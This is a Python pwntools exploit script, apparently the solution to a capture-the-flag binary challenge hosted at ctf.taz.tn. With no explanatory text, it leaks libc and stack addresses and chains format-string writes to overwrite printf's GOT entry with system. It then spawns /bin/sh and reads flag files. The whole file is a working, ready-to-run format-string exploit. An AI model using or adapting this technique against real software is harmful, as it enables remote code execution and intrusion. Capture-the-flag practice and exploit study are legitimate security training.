from pwn import *
import re


HOST = "ctf.taz.tn"
PORT = 10009

elf = context.binary = ELF("./main", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.arch = "amd64"
context.terminal="xterm" #adjust this with ur terminal


def stage1_payload():
    leak_fmt = b"|%52$016lx|%54$016lx|"
    printed = 44
    target = elf.sym.main & 0xFFFF
    pad = (target - printed) % 0x10000
    body = leak_fmt + f"%{pad}c%13$hn".encode()
    body = body.ljust((len(body) + 7) // 8 * 8, b"a")
    return body + p64(0x403008)


def stage3_payload(system_low, saved_rip_addr):
    first = 0x1090
    pad1 = (first - 9) % 0x10000
    pad2 = (system_low - first) % 0x10000

    for idx in range(8, 20):
        body = f"%{pad1}c%{idx}$hn%{pad2}c%58$hn".encode()
        body = body.ljust((len(body) + 7) // 8 * 8, b"a")
        if 8 + len(body) // 8 == idx:
            return body + p64(saved_rip_addr)

    raise ValueError("failed to build stage3 payload")


def read_prompt(io):
    return io.recvuntil(b"Whaaat iss your naaame?\n")


def exploit(io):
    gdb.attach(io,"b* vuln+151")

    leak_line = io.recvline()
    puts_addr = int(leak_line.strip().split(b": ")[1])
    libc.address = puts_addr - libc.sym.puts
    system_low = libc.sym.system & 0xFFFF

    read_prompt(io)

    io.sendline(stage1_payload())
    out1 = read_prompt(io)

    match = re.search(rb"Fank You \|([0-9a-f]{16})\|([0-9a-f]{16})\|", out1)
    if not match:
        raise ValueError("failed to parse stage1 stack leak")

    rbp1 = int(match.group(1), 16)
    rbp2 = rbp1 - 0x120
    rbp3 = rbp2 - 0x120

    # arg58 in the next _start loop survives and can hold printf@got.
    arg58_slot_round3 = rbp3 - 0x170 + 8 * (58 - 8)
    stage2 = fmtstr_payload(
        8,
        {
            arg58_slot_round3: p64(elf.got["printf"]),
            rbp2 + 8: p16(0x1090),
        },
        numbwritten=9,
        write_size="short",
    )
    stage3 = stage3_payload(system_low, rbp3 + 8)

    if len(stage2) > 149 or b"\n" in stage2[:-1]:
        raise ValueError("bad stage2 stack layout")
    if len(stage3) > 149 or b"\n" in stage3[:-1]:
        raise ValueError("bad stage3 stack layout")

    io.sendline(stage2)
    read_prompt(io)

    io.sendline(stage3)
    read_prompt(io)

    io.sendline(b";/bin/sh")


def main():
    while True:
        if args.REMOTE:
            io = remote(HOST, PORT)
        else:
            io = process("./main")

        try:
            exploit(io)
            if args.REMOTE:
                io.sendline(
                    b"cat flag* 2>/dev/null || cat /flag* 2>/dev/null || "
                    b'find / -maxdepth 2 -name "flag*" 2>/dev/null | head'
                )
                print(io.recvrepeat(2).decode(errors="replace"), end="")
                return

            io.sendline(b"echo PWNED")
            print(io.recvrepeat(1).decode(errors="replace"), end="")
            return
        except Exception as exc:
            log.warning(f"retrying: {exc}")
            io.close()


if __name__ == "__main__":
    main()
